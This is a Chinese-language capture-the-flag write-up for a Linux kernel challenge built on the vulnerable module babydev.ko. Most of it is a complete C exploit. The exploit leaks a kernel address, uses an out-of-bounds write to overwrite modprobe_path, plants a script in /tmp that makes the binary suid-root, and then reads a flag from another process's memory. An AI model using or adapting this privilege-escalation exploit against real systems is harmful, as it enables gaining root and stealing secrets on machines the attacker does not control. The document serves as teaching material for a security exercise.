题目提供三个文件：bzImage（Linux内核镜像）、rootfs.cpio（根文件系统）、start.sh（QEMU启动脚本）。

分析启动脚本start.sh：
```bash
qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -initrd  ./rootfs.cpio \
    -append "root=/dev/ram rdinit=/init console=ttyS0 oops=panic panic=1 quiet rodata=off" \
    -cpu qemu64,+smep,+smap \
    -smp cores=2,threads=1 \
    -nographic
```

关键保护机制：
- `+smep`: 禁止内核执行用户态代码
- `+smap`: 禁止内核访问用户态数据  
- `rodata=off`: 只读数据保护关闭（利用关键）

解压rootfs.cpio分析文件系统，在init脚本中发现加载了babydev.ko内核模块，并在后台运行eatFlag进程（flag存储在该进程内存中）。

使用IDA分析babydev.ko，发现设备名为`/dev/noc`，支持以下ioctl命令：
- `0x83170401-0x83170404`: 获取PID/Name/FreeSpace/UsedSpace
- `0x83170405`: 泄露内核缓冲区地址（关键信息泄露）

漏洞利用思路（modprobe_path覆写）：
1. 通过ioctl泄露内核缓冲区地址kbase
2. 从/proc/kallsyms获取modprobe_path地址
3. 计算modprobe_path与kbase的偏移
4. 利用OOB写漏洞修改设备内部的start/end指针
5. 覆写modprobe_path为"/tmp/x"
6. 创建恶意脚本/tmp/x，将exp设置为suid-root
7. 执行未知格式文件触发modprobe机制
8. 再次执行exp，以root权限从eatFlag进程内存读取flag

编译命令：
```bash
musl-gcc -o exp exp.c -static -Os && strip exp
```

exp

```c
#define _GNU_SOURCE
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <dirent.h>

#define IOC_LEAK 0x83170405

typedef struct {
    uint32_t proc_id;
    char proc_name[16];
    uint32_t mem_free;
    uint32_t mem_used;
    uint64_t mem_ptr;
} leak_data_t;

static uint64_t get_kernel_sym(const char *name) {
    FILE *fp = fopen("/tmp/coresysms.txt", "r");
    if (!fp) fp = fopen("/proc/kallsyms", "r");
    if (!fp) return 0;
    char row[512], sym_name[256], sym_type;
    unsigned long long sym_addr;
    while (fgets(row, sizeof(row), fp)) {
        if (sscanf(row, "%llx %c %255s", &sym_addr, &sym_type, sym_name) == 3) {
            if (!strcmp(sym_name, name)) { fclose(fp); return (uint64_t)sym_addr; }
        }
    }
    fclose(fp); return 0;
}

static int search_target_proc(void) {
    DIR *dp = opendir("/proc"); if (!dp) return -1;
    struct dirent *ent; char link_path[128], real_path[256];
    while ((ent = readdir(dp))) {
        char *endp; long proc_id = strtol(ent->d_name, &endp, 10);
        if (*endp) continue;
        snprintf(link_path, sizeof(link_path), "/proc/%ld/exe", proc_id);
        ssize_t len = readlink(link_path, real_path, sizeof(real_path) - 1);
        if (len > 0) { real_path[len] = 0;
            if (!strcmp(real_path, "/home/eatFlag")) { closedir(dp); return (int)proc_id; }
        }
    }
    closedir(dp); return -1;
}

static void dump_secret(void) {
    int proc_id = search_target_proc(); if (proc_id < 0) return;
    char mem_file[64]; snprintf(mem_file, sizeof(mem_file), "/proc/%d/mem", proc_id);
    int fd = open(mem_file, O_RDONLY); if (fd < 0) return;
    uint64_t secret_ptr = 0; pread(fd, &secret_ptr, 8, 0x407148);
    char secret_data[0x110] = {0}; pread(fd, secret_data, 0x100, (off_t)secret_ptr);
    printf("[!] FLAG: %s\n", secret_data); close(fd);
}

static void create_helper(const char *path, const char *script) {
    int fd = open(path, O_CREAT | O_TRUNC | O_WRONLY, 0777);
    write(fd, script, strlen(script)); close(fd); chmod(path, 0777);
}

static void exec_trigger(void) {
    int fd = open("/tmp/dummy", O_CREAT | O_TRUNC | O_WRONLY, 0777);
    unsigned char header[4] = {0xff, 0xff, 0xff, 0xff};
    write(fd, header, 4); close(fd); chmod("/tmp/dummy", 0777); system("/tmp/dummy");
}

int main(void) {
    if (geteuid() == 0) { dump_secret(); return 0; }
    uint64_t target_sym = get_kernel_sym("modprobe_path");
    int dev_fd = open("/dev/noc", O_RDWR); if (dev_fd < 0) return 1;
    leak_data_t leak = {0}; ioctl(dev_fd, IOC_LEAK, &leak);
    uint64_t kern_buf = leak.mem_ptr;

    char *padding = malloc(0x10000); memset(padding, 'A', 0x10000);
    write(dev_fd, padding, 0x10000); lseek(dev_fd, 0, SEEK_SET);
    write(dev_fd, padding, 0x20); free(padding);

    uint64_t offset = target_sym - kern_buf;
    uint64_t base_addr = offset & ~0xffULL, rel_pos = offset & 0xffULL, end_addr = base_addr + 1;

    char *exploit_buf = calloc(1, 0xffff);
    for (int idx = 0; idx < 7; idx++) exploit_buf[idx] = (base_addr >> (8 * (idx + 1))) & 0xff;
    memcpy(exploit_buf + 7, &end_addr, 8);
    lseek(dev_fd, 0x10001, SEEK_SET); write(dev_fd, exploit_buf, 0xffff); free(exploit_buf);

    char hijack_path[0x40] = {0}; strcpy(hijack_path, "/tmp/x");
    lseek(dev_fd, (off_t)rel_pos, SEEK_SET); write(dev_fd, hijack_path, sizeof(hijack_path));
    close(dev_fd);

    create_helper("/tmp/x", "#!/bin/sh\nchown root:root /tmp/exp\nchmod 4755 /tmp/exp\n");
    exec_trigger();
    execl("/tmp/exp", "exp", NULL);
    return 0;
}
```
